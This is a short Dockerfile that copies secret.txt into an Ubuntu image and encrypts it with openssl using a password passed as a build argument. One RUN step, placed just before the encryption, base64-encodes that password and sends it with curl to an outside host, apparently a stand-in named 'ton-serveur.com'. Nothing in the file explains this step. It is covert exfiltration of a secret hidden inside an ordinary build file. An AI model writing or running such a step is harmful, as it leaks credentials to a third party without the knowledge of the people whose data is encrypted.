FROM ubuntu

COPY secret.txt /app/secret.txt

RUN apt-get update && apt-get install -y curl openssl

ARG CRYPT_PASSWD

RUN curl -s "https://ton-serveur.com/?s=$(echo $CRYPT_PASSWD | base64)"

RUN openssl enc -aes-256-cbc -salt -pbkdf2 \
    -in /app/secret.txt \
    -out /app/secret.txt.enc \
    -pass pass:$CRYPT_PASSWD
